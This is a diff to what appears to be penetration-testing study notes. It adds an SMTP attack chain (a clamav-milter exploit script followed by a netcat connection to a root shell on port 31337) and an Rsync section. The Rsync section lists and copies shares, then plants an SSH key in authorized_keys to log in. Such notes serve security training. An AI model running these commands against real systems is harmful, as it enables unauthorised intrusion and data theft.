@@ -217,6 +217,8 @@ Linux
 
 #### SMTP Ports 25, 587, 465
 ```c
+#Enumeration
+    snmp-check IP  >  clamav-milter  /usr/local/sbin/clamav-milter  --black-hole-mode  >  ./4761.pl IP  >  nc -nv IP 31337  >  rooted
 ```
 
 #### IMAP/ POP3 Ports 110, 143, 993, 995
@@ -326,7 +328,18 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
     #Find file privilege
         show variables like "secure_file_priv";
 ```
-
+#### Rsync Port 873
+```c
+#Enumerate
+    rsync IP::   - shows available shares
+    rsync -av --list-only rsync://IP/share_name   - shows content of share
+    rsync -av rsync://IP/shared_name ./rsyn_shared   - copy all files to local machine
+#Exploit
+    ##Upload ssh key and try to ssh in
+        mkdir .ssh && cp ~/.ssh/id_rsa_pub .ssh/authorized_keys
+        rsync -r ./.ssh/ IP::share_name/.ssh
+        ssh -i ~/.ssh/id_rsa share_name@IP
+```
 
 ## Enumeration
 
